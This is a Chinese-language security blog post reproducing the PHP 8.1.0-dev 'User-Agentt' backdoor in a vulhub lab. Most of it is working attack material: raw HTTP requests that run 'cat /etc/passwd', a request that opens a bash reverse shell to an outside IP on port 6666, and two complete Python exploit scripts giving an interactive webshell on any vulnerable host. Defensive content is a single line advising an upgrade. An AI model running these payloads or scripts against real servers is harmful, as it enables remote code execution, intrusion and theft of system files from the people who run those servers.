> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/bgIzJfT_wcSuxwjtFBjhhQ)

**上方蓝色字体关注我们，一起学安全！**

**作者：****Pet3r****@Timeline Sec  
**

**本文字数：1465**

**阅读时长：3～4min**

**声明：请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

PHP verion 8.1.0-dev 于 2021 年 3 月 28 日与后门一起发布，但是后门很快被发现并删除。  

**0x02 漏洞概述**  

  

PHP verion 8.1.0-dev 的 PHP 在服务器上运行，则攻击者可以通过发送 **User-Agentt** 标头执行任意代码。  

**0x03 影响版本**  

  

PHP 8.1.0-dev

**0x04 环境搭建**  

  

使用 vulhub 进行搭建：  

```
cd vulhub/php/8.1-backdoor
sudo docker-compose up -d
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCH9wW40HrjXFUbJicDowtsgRJkdIf1pGq4lhwVbAm8lJ9m3q8084ciakrg/640?wx_fmt=png)

访问主页  

```
http://192.168.40.140:8080/
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHBZnr2ibViaADL8LGGjGfXD4209jVcNESiaL0Eu77OwAEhdl6uJ3eyAD1Q/640?wx_fmt=png)  
  

**0x05 漏洞复现**  

  

**1、POC 验证**  

```
GET / HTTP/1.1
Host: 192.168.40.140:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
User-Agentt: zerodiumvar_dump(2*3); //或者User-Agentt: zerodiumsystem("cat /etc/passwd");
Upgrade-Insecure-Requests: 1
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHyI2k95vdpEcF6FRzvos0wAuNLUGawREQtKTUc4GfNuFFjbO1mv1ia8Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHGLsmf45GiaKqaNb1NdynFiclWjRt1PN1R96jicgpPrpBJDfZPkPwNArtw/640?wx_fmt=png)

```
#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't access tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```

**2、反弹 shell 或执行 exp**  

```
GET / HTTP/1.1
Host: 192.168.40.140:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ADMINCONSOLESESSION=LBY9g1TYdvw2RyGQCX7JTQGt7Rn6TJnDmWhyJtKwMj2nL0M6GyyY!-1150793974; JSESSIONID=0B07F68800D0F5C0D8BD254A8748E2FF
User-Agentt: zerodiumsystem("bash -c 'exec bash -i >& /dev/tcp/192.168.40.129/6666 0>&1'");
Upgrade-Insecure-Requests: 1
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHpyOEEBlS1dseBu0xGbqu2NIyjKDHVlFzXHeCe0MVktyic6J22wKNoxw/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHsfINHFicQTHqILcoIVpAoYicJu4wHhKOUOuXsWiaNcrDgnEibprDQv3DNA/640?wx_fmt=png)  

EXP：

```
import argparse, textwrap
import requests
import sys
 
 
parser = argparse.ArgumentParser(description="PHP 8.1.0-dev WebShell RCE", formatter_class=argparse.RawTextHelpFormatter,
epilog=textwrap.dedent('''
Exploit Usage :
./exploit.py -l http://127.0.0.1
[^] WebShell= id
OR
[^] WebShell= whoami
'''))                    
 
parser.add_argument("-l","--url", help="PHP 8.1.0-dev Target URL(Example: http://127.0.0.1)")
args = parser.parse_args()
 
if len(sys.argv) <= 2:
    print (f"Exploit Usage: ./exploit.py -h [help] -l [url]")         
    sys.exit() 
 
# Variables
Host = args.url
 
r = requests.session()
 
## Use this for Proxy
#r.proxies.update( { 'http':'http://127.0.0.1:8080' } )
 
def svcheck():
    verify = r.get(f'{Host}')
 
    if (verify.headers['X-Powered-By'] == 'PHP/8.1.0-dev') :
        print("Target is running on PHP 8.1.0-dev\n")
        return True
 
def exec():
    headerscontent = {
            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0',
            'User-Agentt' : f'zerodiumsystem("{Command}");'
                     }
  
    door = r.get(f'{Host}', headers = headerscontent, allow_redirects= False)
 
    resp = door.text.split("<!DOCTYPE html>")[0]
    if (resp == ""):
        print()
        print("Invalid Command")
        print()  
    else:
        print()
        print(resp)
 
 
if __name__ == "__main__":
 
    print ('\n[+] PHP 8.1.0-dev WebShell RCE \n ')
    try:   
        if svcheck() == True:
            print("*Type the command* \n")
            try:
                while True:
                    Command = input("[^] WebShell= ")
                    exec()
            except:
                print("\r\nExiting.")
                sys.exit(-1)
     
    except Exception as ex:
        print('Invalid URL or Target not Vulnerable')
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHZPacPsDLu3pxlTqLspsLhHJWIfmNQ3cDQfaNpt58Zgsia5CXGkpFnuA/640?wx_fmt=png)  

**0x06 修复方式**  

  

建议参考官方公告及时升级或安装相应补丁。

**参考链接：**

https://news-web.php.net/php.internals/113838

https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor

https://www.php.net/

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章**

Timeline Sec 团队  

安全路上，与你并肩前行